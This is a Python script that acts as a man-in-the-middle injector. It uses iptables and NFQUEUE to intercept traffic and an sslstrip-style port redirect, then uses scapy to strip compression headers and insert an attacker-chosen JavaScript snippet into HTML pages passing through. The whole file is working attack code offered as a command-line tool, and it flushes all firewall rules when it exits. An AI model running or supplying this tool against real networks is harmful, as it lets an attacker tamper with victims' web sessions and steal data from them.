#!/usr/bin/env python

# iptables - I INPUT - j NFQUEUE - -queue-num 0
# iptables - I OUTPUT - j NFQUEUE - -queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess
import re

ack_list = []

subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0; iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--script', dest='inject_script',
                        help='Enter the script to run ex.(\'alert("XSS")\', \'alert("Test")\')')
    options = parser.parse_args()
    if not options.inject_script:
        # code to handle error
        parser.error(
            '[-] Please specify a Script, use --help for more information.')
    return options


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # delete IP and TCP len/chksum values
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def modify_packet(packet, scapy_packet, inject_script):
    # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        # modify the packet file type
        if scapy_packet[scapy.TCP].dport == 10000:
            # print('HTTP Request')
            print('[+] Request')
            load = re.sub(
                'Accept-Encoding:.*?\\r\\n', '', load)
            load = load.replace('HTTP/1.1', 'HTTP/1.0')
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 10000:
            # print('HTTP Response')

            print('[+] Response')
            # print(inject_script)
            injection_code = '<script>' + inject_script + ';</script>'
            load = load.replace(
                '</body>', injection_code + '</body>')
            content_length_search = re.search(
                '(?:Content-Length:\\s)(\\d*)', load)
            if content_length_search and 'text/html' in load:
                content_length = content_length_search.group(1)
                # print(content_length)
                new_content_length = int(
                    content_length) + len(inject_script)
                # print(content_length, new_content_length)
                load = load.replace(content_length, str(new_content_length))
                # print(load)

            # print(scapy_packet.show())
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
        # print(scapy_packet.show())


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    modify_packet(packet, scapy_packet,
                  options.inject_script)
    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    options = get_arguments()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
